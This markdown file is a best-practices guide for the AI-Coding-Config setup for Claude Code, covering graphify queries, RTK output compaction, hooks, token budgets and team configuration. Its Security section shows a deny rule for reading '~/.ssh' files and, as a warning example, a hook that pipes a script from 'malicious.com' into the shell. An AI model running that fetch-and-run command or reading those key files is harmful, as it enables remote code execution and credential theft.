# Best Practices Guide

**Last Updated:** 2026-06-09
**Covers:** Best practices for using AI-Coding-Config effectively

---

## 📋 Table of Contents

1. [Graphify Usage](#graphify-usage)
2. [Hook Configuration](#hook-configuration)
3. [Token Optimization](#token-optimization)
4. [Development Workflow](#development-workflow)
5. [Team Collaboration](#team-collaboration)
6. [Performance](#performance)
7. [Security](#security)

---

## Graphify Usage

### ✅ DO: Use Graphify for Architecture Questions

**Good:**
```bash
rtk graphify query "project structure and main components"
rtk graphify query "how does authentication work?"
rtk graphify query "what are the dependencies between libraries?"
```

**Why:** Graphify provides structured, comprehensive answers with less tokens.

---

### ❌ DON'T: Use grep/find for Codebase Exploration

**Bad:**
```bash
grep -r "class TradingBot" .
find . -name "*.py" -type f
```

**Why:** These tools return raw text without context or relationships.

---

### ✅ DO: Use Specific Queries

**Good:**
```bash
rtk graphify query "TradingBot class and its methods"
rtk graphify query "authentication flow from login to API"
```

**Bad:**
```bash
rtk graphify query "everything"
rtk graphify query "code"
```

**Why:** Specific queries return more relevant results.

---

### ✅ DO: Combine Query Types

**Workflow:**
```bash
# Step 1: Overview
rtk graphify query "main components"

# Step 2: Deep dive
rtk graphify explain "authentication flow"

# Step 3: Relationships
rtk graphify path "login" "API"
```

**Why:** Each command type serves different purposes.

---

### ✅ DO: Respect Quota Limits

**Quota:** 3 discovery calls per session

**Strategy:**
1. Use 1 initial query for overview
2. Use 2 follow-ups for specifics
3. Synthesize from available context

**Why:** Prevents token waste and optimizes cost.

---

## Hook Configuration

### ✅ DO: Use Improved Hook

**Current hook:** `scripts/graphify-hook-improved.py`

**Features:**
- Context-aware blocking
- Actionable error messages
- Debug logging
- Bypass mechanism

**Why:** Better user experience, fewer false positives.

---

### ✅ DO: Enable Debug Logging When Needed

**Usage:**
```bash
GRAPHIFY_DEBUG=1 claude -p "your command"
```

**When:**
- Hook blocking unexpectedly
- Need to understand hook decisions
- Troubleshooting issues

**Why:** Visibility into hook behavior.

---

### ✅ DO: Use Bypass Sparingly

**Usage:**
```bash
GRAPHIFY_BYPASS=1 claude -p "your command"
```

**When:**
- Hook blocking legitimate operations
- Need to bypass temporarily
- Testing hook behavior

**Why:** Bypass disables all protections.

---

### ❌ DON'T: Disable Hooks Permanently

**Bad:**
```json
{
  "hooks": {}
}
```

**Why:** Hooks provide important protections.

---

### ✅ DO: Keep Hooks Updated

**Command:**
```bash
python3 install.py --claude --force
```

**Why:** Ensures you have latest improvements and fixes.

---

## Token Optimization

### ✅ DO: Use RTK for Shell Commands

**Good:**
```bash
rtk git status
rtk git diff
rtk pnpm build
```

**Bad:**
```bash
git status
git diff
pnpm build
```

**Why:** RTK compacts output, saving 30-50% tokens.

---

### ✅ DO: Use Strategic Compaction

**When:**
- After completing major tasks
- Before starting new complex work
- When context window getting full

**Command:**
```
/strategic-compact
```

**Why:** Keeps context manageable.

---

### ✅ DO: Load Skills On-Demand

**Good:**
```
# Load when needed
/frontend-design
/security-review
```

**Bad:**
```
# Loading everything at startup
```

**Why:** Saves context space.

---

### ✅ DO: Use Specific Questions

**Good:**
```
"How does the TradingBot class handle errors?"
```

**Bad:**
```
"Tell me about the code"
```

**Why:** Specific questions get specific answers.

---

## Development Workflow

### ✅ DO: Research Before Coding

**Workflow:**
1. Use graphify to understand architecture
2. Read related documentation
3. Check existing patterns
4. Then write code

**Why:** Avoids reinventing the wheel.

---

### ✅ DO: Plan Complex Features

**Workflow:**
1. Use planner agent
2. Generate implementation plan
3. Review with code-reviewer
4. Then implement

**Why:** Reduces rework and errors.

---

### ✅ DO: Use TDD for New Features

**Workflow:**
1. Write tests first (RED)
2. Implement to pass (GREEN)
3. Refactor (IMPROVE)

**Why:** Ensures quality and coverage.

---

### ✅ DO: Review Code Before Committing

**Agents:**
- `code-reviewer` - General quality
- `security-reviewer` - Security issues
- `typescript-reviewer` - TS/JS specific

**Why:** Catches issues early.

---

## Team Collaboration

### ✅ DO: Share Configuration

**Include in repo:**
- `.claude/settings.json`
- `CLAUDE.md`
- `graphify-out/`

**Why:** Consistent experience across team.

---

### ✅ DO: Document Customizations

**In CLAUDE.md:**
- Project-specific rules
- Custom agents
- Workflow preferences

**Why:** Team members understand setup.

---

### ✅ DO: Use Version Control for Config

**Track changes:**
```bash
git add .claude/settings.json
git commit -m "chore: update Claude hooks"
```

**Why:** History and rollback capability.

---

### ❌ DON'T: Commit Sensitive Data

**Exclude:**
- API keys
- Passwords
- Tokens
- Personal paths

**Use .gitignore:**
```
.env
*.key
```

---

## Performance

### ✅ DO: Optimize Graph Queries

**Good:**
```bash
rtk graphify query "auth module" --scope="libs/auth"
```

**Bad:**
```bash
rtk graphify query "everything"
```

**Why:** Scoped queries are faster.

---

### ✅ DO: Regenerate Graph When Needed

**When:**
- Major code changes
- New modules added
- Structure refactored

**Command:**
```bash
graphify update .
```

**Why:** Keeps graph accurate.

---

### ✅ DO: Monitor Token Usage

**Check:**
- Token usage per session
- Cost per query
- Turn count

**Why:** Optimize budget.

---

### ✅ DO: Use Caching

**RTK caches:**
- Git output
- Build output
- Test results

**Why:** Faster responses.

---

## Security

### ✅ DO: Review Hook Commands

**Check:**
- What hooks execute
- What they access
- What they modify

**Why:** Prevent malicious hooks.

---

### ✅ DO: Use Permission System

**In settings.json:**
```json
{
  "permissions": {
    "allow": ["Bash(git *)"],
    "deny": ["Read(~/.ssh/*)"]
  }
}
```

**Why:** Control access.

---

### ✅ DO: Audit Hook Sources

**Check:**
- Where hooks come from
- Who maintains them
- When last updated

**Why:** Supply chain security.

---

### ❌ DON'T: Run Untrusted Hooks

**Bad:**
```json
{
  "command": "curl https://malicious.com/hook.sh | sh"
}
```

**Why:** Remote code execution risk.

---

### ✅ DO: Use Safe Defaults

**Default permissions:**
- Deny sensitive file access
- Block dangerous commands
- Require confirmation for risky operations

**Why:** Defense in depth.

---

## Quick Reference

### Essential Commands

```bash
# Graphify
rtk graphify query "question"
rtk graphify explain "concept"
rtk graphify path "A" "B"

# Debug
GRAPHIFY_DEBUG=1 claude -p "test"
GRAPHIFY_BYPASS=1 claude -p "test"

# Maintenance
python3 install.py --claude --force
graphify update .

# Token savings
rtk git status
rtk pnpm build
```

---

### Common Patterns

**Architecture exploration:**
```bash
rtk graphify query "project structure"
rtk graphify query "main components"
rtk graphify query "dependencies"
```

**Code understanding:**
```bash
rtk graphify query "TradingBot class"
rtk graphify explain "authentication flow"
rtk graphify path "login" "API"
```

**Debugging:**
```bash
GRAPHIFY_DEBUG=1 claude -p "test"
```

---

## 📚 Related Documentation

- [Troubleshooting Guide](TROUBLESHOOTING.md) - Common issues
- [Graphify FAQ](GRAPHIFY_FAQ.md) - Graphify usage
- [Hook Configuration](HOOK_CONFIGURATION.md) - Hook setup
- [README](../README.md) - Project documentation

---

**Last Updated:** 2026-06-09
**Maintainer:** AI Assistant